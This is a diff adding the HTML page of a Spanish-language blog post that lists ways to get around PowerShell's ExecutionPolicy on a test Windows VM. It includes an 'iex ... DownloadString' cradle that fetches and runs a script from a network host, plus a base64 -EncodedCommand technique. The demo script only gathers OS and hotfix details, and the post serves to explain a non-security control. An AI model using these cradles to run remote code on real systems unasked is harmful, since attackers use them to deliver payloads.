@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+
+  <title>Saltándose los controles de la Powershell</title>
+
+  <meta name="author" content="Out of Memory" />
+
+  
+  <meta name="description" content="Mecanismos de bypass para la PowerShell ExecutionPolicy">
+  
+
+  <link rel="alternate" type="application/rss+xml" title="outofmemory.io - You can't always apt-get what you want" href="http://localhost:4000/feed.xml" />
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css" />
+    
+      <link rel="stylesheet" href="/css/main.css" />
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Saltándose los controles de la Powershell" />
+  
+
+   
+  <meta property="og:description" content="Mecanismos de bypass para la PowerShell ExecutionPolicy">
+  
+
+
+  <meta property="og:type" content="website" />
+
+  
+  <meta property="og:url" content="http://localhost:4000/2016-12-13-powershell-controls/" />
+  <link rel="canonical" href="http://localhost:4000/2016-12-13-powershell-controls/" />
+  
+
+  
+  <meta property="og:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@" />
+  <meta name="twitter:creator" content="@" />
+
+  
+  <meta name="twitter:title" content="Saltándose los controles de la Powershell" />
+  
+
+  
+  <meta name="twitter:description" content="Mecanismos de bypass para la PowerShell ExecutionPolicy">
+  
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+  
+
+  
+
+</head>
+
+
+  <body>
+
+    
+
+
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button><a class="navbar-brand" href="http://localhost:4000/">outofmemory.io</a></div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+          <li><a href="/about">About</a></li></ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="http://localhost:4000/">
+	      <img class="avatar-img" src="/img/powershell.png" />
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Saltándose los controles de la Powershell</h1>
+		  
+		    
+			<h2 class="post-subheading">Mecanismos de bypass para la PowerShell ExecutionPolicy</h2>
+			
+		  
+		  
+		  
+		  <span class="post-meta">Posted on December 13, 2016</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <p>En una de las charlas a las que acude con frecuencia -bueno, creo que en varias :)-, <a href="https://twitter.com/pablogonzalezpe">Pablo González</a> estuvo explicando diferentes posibilidades para ejecutar scripts en PowerShell “saltándose” los controles de ejecución (ExecutionPolicy).</p>
+
+<p>La <a href="https://technet.microsoft.com/es-ES/library/ee176961.aspx">ExecutionPolicy</a> determina qué scripts PowerShell tienen autorización para ejecutarse en un sistema. Windows ofrece cuatro políticas:</p>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th>ExecutionPolicy</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Restricted</td>
+      <td>No se puede ejecutar ningún script, la PowerShell solo se puede usar en modo interactivo</td>
+    </tr>
+    <tr>
+      <td>AllSigned</td>
+      <td>Solo se pueden ejecutar scripts firmados por una entidad de confianza</td>
+    </tr>
+    <tr>
+      <td>RemoteSigned</td>
+      <td>Los scripts descargados de internet deben estar formados por una entidad de confianza</td>
+    </tr>
+    <tr>
+      <td>Unrestricted</td>
+      <td>Todos los Windows PowerShell scripts se pueden ejecutar, sin restricción</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Por defecto la política suele ser “Restricted” o “RemoteSigned”. Por ejemplo:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\&gt; <span class="nb">get-executionpolicy</span> -list
+<span class="nb">get-executionpolicy</span> -list
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      <span class="k">Process       </span>Undefined
+  CurrentUser       Undefined
+ LocalMachine      Restricted
+</code></pre></div></div>
+
+<p>Esto quiere decir que no vamos a poder ejecutar scripts no firmados. A ver si es verdad, creamos un script chorra y tratamos de ejecutarlo:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nb">echo</span> <span class="s2">"Get-ChildItem"</span> <span class="o">&gt;</span>foo.ps1
+<span class="nb">echo</span> <span class="s2">"Get-ChildItem"</span> <span class="o">&gt;</span>foo.ps1
+
+<span class="nb">PS </span>C:\Users\IEUser&gt; ./foo.ps1
+./foo.ps1
+./foo.ps1 : File C:\Users\IEUser\foo.ps1 cannot be loaded because running scripts is disabled on this system. <span class="k">For </span>more
+information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
+At line:1 <span class="kt">char</span>:1
++ ./foo.ps1
++ ~~~~~~~~~
+    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+</code></pre></div></div>
+
+<p>Llegados a este punto, hay que explicar que Microsoft no implementa la <code class="highlighter-rouge">ExecutionPolicy</code> como un mecanismo de seguridad, sino como un simple control para evitar la ejecución de scripts <em>inadvertidamente</em>:</p>
+
+<p><a href="https://technet.microsoft.com/en-us/gg261722.aspx">Windows PowerShell Script Security</a></p>
+
+<blockquote>
+  <p>It may seem odd to permit users to override an administrator-established value for the execution policy, but remember that the execution policy is intended to help stop unintended script execution. It is not intended to stop skilled users from executing scripts at all, merely to ensure that they do not do so without knowing what they are doing.</p>
+</blockquote>
+
+<p>Bien, aclarado esto vamos a saltarnos el “control”. Supongamos que queremos ejecutar una serie de comandos para obtener información de una máquina; para que no sea muy largo nos limitaremos a esto:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\users\IEUser&gt; <span class="nb">Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl
+Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl
+
+
+</span>Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : \Device\HarddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+<span class="nb">PS </span>C:\users\IEUser&gt; <span class="nb">Get-Hotfix
+Get-Hotfix
+
+</span>Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+</code></pre></div></div>
+
+<p>Almacenamos el “script” en un fichero Get-BasicInfo.ps1 e intentamos ejecutarlo. Y, claro, pasa lo que pasa:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\users\IEUser&gt; ./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1 : File C:\users\IEUser\Get-BasicInfo.ps1 cannot be loaded because running scripts is disabled on
+this system. <span class="k">For </span>more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
+At line:1 <span class="kt">char</span>:1
++ ./Get-BasicInfo.ps1
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+</code></pre></div></div>
+
+<p>Pues veamos algunas de las numerosas soluciones al <em>problema</em>:</p>
+
+<ul id="markdown-toc">
+  <li><a href="#copiar-y-pegar" id="markdown-toc-copiar-y-pegar">Copiar y pegar</a></li>
+  <li><a href="#echo--pipe" id="markdown-toc-echo--pipe">echo + pipe</a></li>
+  <li><a href="#descargar-de-url--invoke-expression" id="markdown-toc-descargar-de-url--invoke-expression">Descargar de URL + Invoke Expression</a></li>
+  <li><a href="#argumento--command" id="markdown-toc-argumento--command">Argumento -command</a></li>
+  <li><a href="#argumento--encodedcommand" id="markdown-toc-argumento--encodedcommand">Argumento -encodedCommand</a></li>
+  <li><a href="#el-comando-invoke-command" id="markdown-toc-el-comando-invoke-command">El comando Invoke-Command</a></li>
+  <li><a href="#-executionpolicy-bypass" id="markdown-toc--executionpolicy-bypass">-ExecutionPolicy Bypass</a></li>
+  <li><a href="#-executionpolicy-unrestricted" id="markdown-toc--executionpolicy-unrestricted">-ExecutionPolicy Unrestricted</a></li>
+  <li><a href="#cambiar-executionpolicy-para-este-proceso-en-particular" id="markdown-toc-cambiar-executionpolicy-para-este-proceso-en-particular">Cambiar ExecutionPolicy para este proceso en particular</a></li>
+  <li><a href="#lo-mismo-para-un-usuario" id="markdown-toc-lo-mismo-para-un-usuario">Lo mismo para un usuario</a></li>
+</ul>
+
+<h2 id="copiar-y-pegar">Copiar y pegar</h2>
+
+<p>Tal cual. Basta con copiar y pegar el contenido del script. Porque entonces ya no es un script, es <em>interactivo… :)</em></p>
+
+<h2 id="echo--pipe">echo + pipe</h2>
+
+<p>Obtener el contenido del script con <code class="highlighter-rouge">echo</code>, <code class="highlighter-rouge">type</code> p similar (<code class="highlighter-rouge">Get-Content</code>, pasa ser más <em>posh</em>) y pasárselo vía pipe a… una powershell:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\users\ieuser&gt; <span class="nb">Get-Content </span>Get-BasicInfo.ps1 | powershell -noprofile -
+<span class="nb">Get-Content </span>Get-BasicInfo.ps1 | powershell -noprofile -
+Cannot load PSReadline module.  Console is running without PSReadline.
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : \Device\HarddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+
+
+
+Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM
+</code></pre></div></div>
+
+<h2 id="descargar-de-url--invoke-expression">Descargar de URL + Invoke Expression</h2>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\users\ieuser&gt; powershell -nop -c <span class="s2">"iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')"</span>
+powershell -nop -c <span class="s2">"iex(New-Object Net.WebClient).DownloadString('http://10.254.0.1:8000/Get-BasicInfo.ps1')"</span>
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+InstallDate             : 7/21/2016 9:12:03 AM
+ServicePackMajorVersion : 0
+OSArchitecture          : 64-bit
+BootDevice              : \Device\HarddiskVolume1
+BuildNumber             : 14393
+CSName                  : MSEDGEWIN10
+
+
+
+
+Source        Description      HotFixID      InstalledBy          InstalledOn              
+------        -----------      --------      -----------          -----------              
+MSEDGEWIN10   Update           KB3199986     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Security Update  KB3202790     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM   
+MSEDGEWIN10   Update           KB3201845     NT AUTHORITY\SYSTEM  12/13/2016 12:00:00 AM
+</code></pre></div></div>
+
+<h2 id="argumento--command">Argumento -command</h2>
+
+<p>Parecido a “copiar y pegar”:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\users\ieuser&gt; powershell -command <span class="s2">"Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
+powershell -command "</span><span class="nb">Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl</span>
+<span class="o">&gt;&gt;</span> <span class="nb">Get-Hotfix</span><span class="s2">"
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+[...]
+</span></code></pre></div></div>
+
+<p>(Ya no pongo la salida más veces si no es estrictamente necesario)</p>
+
+<h2 id="argumento--encodedcommand">Argumento -encodedCommand</h2>
+
+<p>Esto viene directamente the <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">the NetSPI blog</a>. Es, de nuevo, “pegar” el contenido de nuestro script en una varible, codificarla en unicode/base64 -lo que evitaría problemas habituales del caso anterior- y ejecutarla mendiante <code class="highlighter-rouge">-encodedCommand</code>. Por ejemplo:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nv">$command</span><span class="o">=</span><span class="s2">"Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | fl
+</span><span class="nv">$command</span><span class="s2">="</span><span class="nb">Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl</span>
+<span class="o">&gt;&gt;</span> <span class="nb">Get-Hotfix</span><span class="s2">"
+Get-Hotfix"</span>
+<span class="o">&gt;&gt;</span>
+</code></pre></div></div>
+
+<p>Codificamos:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nv">$bytes</span> <span class="o">=</span> <span class="o">[</span>System.Text.Encoding]::Unicode.GetBytes<span class="o">(</span><span class="nv">$command</span><span class="o">)</span>
+<span class="nv">$bytes</span> <span class="o">=</span> <span class="o">[</span>System.Text.Encoding]::Unicode.GetBytes<span class="o">(</span><span class="nv">$command</span><span class="o">)</span>
+
+<span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nv">$encodedCommand</span> <span class="o">=</span> <span class="o">[</span>Convert]::ToBase64String<span class="o">(</span><span class="nv">$bytes</span><span class="o">)</span>
+<span class="nv">$encodedCommand</span> <span class="o">=</span> <span class="o">[</span>Convert]::ToBase64String<span class="o">(</span><span class="nv">$bytes</span><span class="o">)</span>
+
+<span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nv">$encodedCommand</span>
+<span class="nv">$encodedCommand</span>
+<span class="nv">RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAIABDAGEAcAB0AGkAbwBuACwAIABJAG4AcwB0AGEAbABsAEQAYQB0AGUALAAgAFMAZQByAHYAaQBjAGUAUABhAGMAawBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAsACAATwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACwAIABCAG8AbwB0AEQAZQB2AGkAYwBlACwAIAAgAEIAdQBpAGwAZABOAHUAbQBiAGUAcgAsACAAQwBTAE4AYQBtAGUAIAB8ACAAZgBsAAoARwBlAHQALQBIAG8AdABmAGkAeAA</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>Y ejecutamos:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; powershell.exe -EncodedCommand <span class="nv">$encodedCommand</span>
+powershell.exe -EncodedCommand <span class="nv">$encodedCommand</span>
+<span class="c1">#&lt; CLIXML</span>
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h2 id="el-comando-invoke-command">El comando Invoke-Command</h2>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; invoke-command -scriptblock <span class="o">{</span><span class="nb">Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl</span>;<span class="nb">echo</span>;<span class="nb">Get-Hotfix</span><span class="o">}</span>
+invoke-command -scriptblock <span class="o">{</span><span class="nb">Get-CimInstance </span>Win32_OperatingSystem | <span class="nb">Select-Object  </span>Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | <span class="nb">fl</span>;<span class="nb">echo</span>;<span class="nb">Get-Hotfix</span><span class="o">}</span>
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h2 id="-executionpolicy-bypass">-ExecutionPolicy Bypass</h2>
+
+<p>Esta me parece cachondísima:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1
+PowerShell.exe -ExecutionPolicy Bypass -File Get-BasicInfo.ps1
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h2 id="-executionpolicy-unrestricted">-ExecutionPolicy Unrestricted</h2>
+
+<p>Similar a la anterior, con sutiles diferencias esbozadas en <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">the NetSPI blog</a> o en la documentación de Microsoft:</p>
+
+<ul>
+  <li><a href="https://blogs.technet.microsoft.com/christwe/2012/09/20/but-i-ran-set-executionpolicy-unrestricted-what-is-going-on/">But I ran Set-Executionpolicy unrestricted, what is going on?</a></li>
+  <li><a href="https://msdn.microsoft.com/powershell/reference/5.1/Microsoft.PowerShell.Core/about/about_Execution_Policies">MSDN: About Execution Policies</a></li>
+</ul>
+
+<h2 id="cambiar-executionpolicy-para-este-proceso-en-particular">Cambiar ExecutionPolicy para este proceso en particular</h2>
+
+<p>La <code class="highlighter-rouge">ExecutionPolicy</code> puede ser distinta en distintos ámbitos; pues la cambiamos para este proceso de PowerShell:</p>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nb">Get-ExecutionPolicy</span> -list
+<span class="nb">Get-ExecutionPolicy</span> -list
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      <span class="k">Process       </span>Undefined
+  CurrentUser      Restricted
+ LocalMachine      Restricted
+
+
+
+<span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nb">Set-ExecutionPolicy </span>Unrestricted -Scope <span class="k">Process
+</span><span class="nb">Set-ExecutionPolicy </span>Unrestricted -Scope <span class="k">Process
+
+</span><span class="nb">PS </span>C:\Users\IEUser&gt; ./Get-BasicInfo.ps1
+./Get-BasicInfo.ps1
+
+
+Caption                 : Microsoft Windows 10 Enterprise Evaluation
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h2 id="lo-mismo-para-un-usuario">Lo mismo para un usuario</h2>
+
+<div class="language-posh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">PS </span>C:\Users\IEUser&gt; <span class="nb">Set-ExecutionPolicy </span>Unrestricted -Scope CurrentUser
+</code></pre></div></div>
+
+<p>Hay muchas otras formas, algunas creativas y originales, pero esto es más que suficiente. Queda suficientemente claro que Microsoft nunca entendió la <code class="highlighter-rouge">ExecutionPolicy</code> como un control de seguridad; de hecho, proporciona los mecanismos para sortearla.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="/tags#security">security</a>
+          
+            <a href="/tags#powershell">powershell</a>
+          
+            <a href="/tags#microsoft">microsoft</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Salt%C3%A1ndose+los+controles+de+la+Powershell&url=http%3A%2F%2Flocalhost%3A4000%2F2016-12-13-powershell-controls%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="/2016-12-06-first-post/" data-toggle="tooltip" data-placement="top" title="First post!">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="next">
+          <a href="/2019-09-20-welcome-to-jekyll/" data-toggle="tooltip" data-placement="top" title="Welcome to Jekyll!">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links"><li><a href="/feed.xml" title="RSS"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">RSS</span>
+              </a>
+            </li><li><a href="mailto:outofmemory.io@protonmail.com" title="Email me"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Email me</span>
+              </a>
+            </li><li><a href="https://github.com/lmarqueta" title="GitHub"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">GitHub</span>
+              </a>
+            </li><li><a href="https://twitter.com/outofmemory_io" title="Twitter"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Twitter</span>
+              </a>
+            </li></ul>
+      <p class="copyright text-muted">
+      Out of Memory
+      &nbsp;&bull;&nbsp;
+      2019
+
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://localhost:4000/">outofmemory.io</a>
+      
+
+      
+      </p>
+          <!-- Please don't remove this, keep my open source work credited :) -->
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+          document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/main.js"></script>
+    
+  
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+  <script>
+  window.cookieconsent.initialise({
+    "palette": {
+      "popup": {
+        "background": "#252e39"
+      },
+      "button": {
+        "background": "#14a7d0"
+      }
+    },
+    "theme": "classic"
+  });
+  </script>
+  </body>
+</html>
